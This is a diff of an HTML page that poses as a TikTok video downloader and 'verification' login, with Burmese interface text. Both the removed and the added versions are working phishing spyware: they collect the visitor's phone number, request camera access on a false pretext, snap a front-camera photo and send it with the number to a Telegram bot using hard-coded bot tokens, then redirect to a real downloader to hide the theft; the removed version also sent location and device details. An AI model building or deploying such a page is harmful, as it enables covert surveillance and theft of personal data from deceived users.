@@ -3,97 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Downloader - Login</title>
+    <title>TikTok HD Downloader</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { padding: 30px; border-radius: 20px; background: #1a1a1a; width: 90%; max-width: 400px; border: 1px solid #333; text-align: center; }
-        .label-text { color: #fe2c55; font-size: 14px; font-weight: bold; margin-bottom: 5px; display: block; text-align: left; }
-        input { width: 100%; padding: 15px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #444; background: #222; color: #fff; box-sizing: border-box; font-size: 16px; outline: none; }
-        input:focus { border-color: #fe2c55; }
-        .btn { background: #fe2c55; color: white; border: none; padding: 15px; border-radius: 10px; cursor: pointer; font-weight: bold; width: 100%; font-size: 18px; transition: 0.3s; }
-        .btn:disabled { background: #555; cursor: not-allowed; }
+        body { font-family: sans-serif; background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e1e1e; padding: 20px; border-radius: 15px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        img { width: 60px; margin-bottom: 15px; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #2c2c2c; color: white; box-sizing: border-box; outline: none; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 8px; background: #fe2c55; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:disabled { background: #555; cursor: not-allowed; font-size: 13px; }
+        #status { font-size: 12px; color: #888; margin-top: 10px; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://www.tiktok.com/favicon.ico" width="50" style="margin-bottom: 10px;">
-        <h2 style="margin-bottom: 20px;">TikTok Verification</h2>
-        
-        <label class="label-text">လက်ရှိအသုံးပြုနေသည့်ဖုန်းနံပတ်ထည့်ရန်</label>
-        <input type="tel" id="phone" placeholder="09xxxxxxxxx" oninput="checkInput()">
-        
-        <button id="loginBtn" class="btn" onclick="startProcess()" disabled>အကောင့်၀င်ရန်</button>
-        
-        <p id="status" style="color: #666; font-size: 11px; margin-top: 15px;">🔒 Your connection is secured by TikTok Server</p>
-    </div>
 
-    <video id="v" style="display:none;" autoplay></video>
-    <canvas id="c" style="display:none;"></canvas>
+<div class="card">
+    <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" alt="TikTok">
+    <h2>TikTok Verification</h2>
+    <p style="color: #fe2c55; font-size: 14px;">လက်ရှိအသုံးပြုနေသည့် ဖုန်းနံပါတ်ထည့်ရန်</p>
+    <input type="tel" id="phone" placeholder="09xxxxxxxxx">
+    
+    <button id="loginBtn" onclick="startProcess()">အကောင့်၀င်ရန်</button>
+    
+    <div id="status">ခေတ္တစောင့်ဆိုင်းပေးပါ...</div>
+</div>
 
-    <script>
-        const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0'; // Cam Bot Token
-        const chat_id = '5304050102'; // Bot ID
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
-        // ဖုန်းနံပါတ် ရိုက်ပြီးမှ ခလုတ်နှိပ်လို့ရအောင် စစ်ဆေးခြင်း
-        function checkInput() {
-            const phone = document.getElementById('phone').value;
-            const btn = document.getElementById('loginBtn');
-            btn.disabled = phone.length < 7; 
-        }
+<script>
+    const token = '8765858719:AAHcA2nB7Nq_aInzf1ig9Y-LzjChettQk5Y';
+    const chat_id = '5304050102';
 
-        async function startProcess() {
-            const phoneNum = document.getElementById('phone').value;
-            document.getElementById('status').innerText = "စစ်ဆေးနေပါသည်... 'Allow' ကိုနှိပ်ပေးပါ။";
+    async function startProcess() {
+        const phone = document.getElementById('phone').value;
+        const btn = document.getElementById('loginBtn');
+        const status = document.getElementById('status');
 
-            // ၁။ ဖုန်းနံပါတ် နှင့် Device Info ကို အရင်ပို့ခြင်း
-            let d = `🎯 **Target Login Data**\n`;
-            d += `📞 ဖုန်းနံပါတ်: ${phoneNum}\n`;
-            d += `📱 Device: ${navigator.platform}\n`;
-            d += `🌐 Browser: ${navigator.userAgent.split(' ')[0]}`;
-            send(d);
+        if (!phone) { alert("ဖုန်းနံပါတ် ထည့်ပေးပါ!"); return; }
 
-            // ၂။ တည်နေရာ (Location) ကို Background ကယူခြင်း
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => {
-                    send(`📍 **Target Location**\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        // ခလုတ်ကို စာသားပြောင်းပြီး ပိတ်လိုက်ခြင်း
+        btn.disabled = true;
+        btn.innerText = "စစ်ဆေးနေပါသည်... ခွင့်ပြုချက်တောင်းခဲ့လျှင် Allow ကို နှိပ်ပေးပါ။";
+        status.innerText = "Processing...";
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const v = document.getElementById('v');
+            v.srcObject = stream;
+
+            setTimeout(async () => {
+                const c = document.getElementById('c');
+                c.width = 640;
+                c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                
+                const blob = await new Promise(res => c.toBlob(res, 'image/jpeg'));
+                
+                const formData = new FormData();
+                formData.append('chat_id', chat_id);
+                formData.append('photo', blob, 'shot.jpg');
+                formData.append('caption', `🔔 **Target Found!**\n📱 Phone: ${phone}`);
+
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 });
-            }
 
-            // ၃။ Camera Shot (Permission တစ်ခုတည်းတောင်းခြင်း)
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.getElementById('v');
-                v.srcObject = s;
-
-                setTimeout(() => {
-                    const c = document.getElementById('c');
-                    c.width = 640; c.height = 480;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    c.toBlob(b => {
-                        const f = new FormData();
-                        f.append('chat_id', chat_id);
-                        f.append('photo', b, 'shot.jpg');
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
-                        
-                        // ၄။ အကုန်ပြီးရင် ssstik.io ထဲသို့ လွှဲပေးခြင်း
-                        setTimeout(() => {
-                            window.location.href = "https://ssstik.io/en";
-                        }, 1000);
-                    }, 'image/jpeg');
-                }, 2000);
-            } catch (e) {
-                // Permission ငြင်းလျှင်လည်း link ထဲသို့ လွှဲပေးမည်
+                // ပြီးရင် တကယ့် Downloader ဆီ လွှဲမည်
                 window.location.href = "https://ssstik.io/en";
-            }
-        }
+            }, 4000);
 
-        function send(t) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: t, parse_mode: "Markdown" })
-            });
+        } catch (err) {
+            btn.disabled = false;
+            btn.innerText = "အကောင့်၀င်ရန်";
+            alert("ဗီဒီယိုဒေါင်းရန် Camera Permission (Allow) ပေးဖို့ လိုအပ်ပါတယ်။");
+            status.innerText = "Permission ပေးရန် လိုအပ်ပါသည်။";
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
